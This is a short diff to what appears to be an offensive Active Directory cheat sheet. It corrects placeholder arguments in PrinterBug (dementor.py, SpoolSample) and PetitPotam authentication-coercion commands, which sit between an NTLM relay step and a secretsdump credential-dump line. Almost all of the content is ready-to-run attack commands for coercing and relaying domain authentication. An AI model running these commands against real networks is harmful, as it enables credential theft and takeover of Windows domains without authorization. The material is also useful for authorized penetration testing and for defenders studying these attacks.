@@ -245,13 +245,13 @@ secretsdump.py -k -no-pass target.lab.local
 * Trigger the authentication to relay to our nltmrelayx: `PetitPotam.exe WIN-UBNW4FI3AP0@80/test.txt 10.0.0.4`, the listener host must be specified with the FQDN or full netbios name like `logger.domain.local@80/test.txt`. Specifying the IP results in anonymous auth instead of System. 
   ```ps1
   # PrinterBug
-  dementor.py -d "DOMAIN" -u "USER" -p "PASSWORD" "ATTACKER_NETBIOS_NAME@PORT/randomfile.txt" "ATTACKER_IP"
-  SpoolSample.exe "ATTACKER_IP" "ATTACKER_NETBIOS_NAME@PORT/randomfile.txt"
+  dementor.py -d "DOMAIN" -u "USER" -p "PASSWORD" "ATTACKER_NETBIOS_NAME@PORT/randomfile.txt" "TARGET_IP"
+  SpoolSample.exe "TARGET_IP" "ATTACKER_NETBIOS_NAME@PORT/randomfile.txt"
 
   # PetitPotam
-  Petitpotam.py "ATTACKER_NETBIOS_NAME@PORT/randomfile.txt" "ATTACKER_IP"
-  Petitpotam.py -d "DOMAIN" -u "USER" -p "PASSWORD" "ATTACKER_NETBIOS_NAME@PORT/randomfile.txt" "ATTACKER_IP"
-  PetitPotam.exe "ATTACKER_NETBIOS_NAME@PORT/randomfile.txt" "ATTACKER_IP"
+  Petitpotam.py "ATTACKER_NETBIOS_NAME@PORT/randomfile.txt" "TARGET_IP"
+  Petitpotam.py -d "DOMAIN" -u "USER" -p "PASSWORD" "ATTACKER_NETBIOS_NAME@PORT/randomfile.txt" "TARGET_IP"
+  PetitPotam.exe "ATTACKER_NETBIOS_NAME@PORT/randomfile.txt" "TARGET_IP"
   ```
 * Use the created account to ask for a service ticket: 
     ```ps1
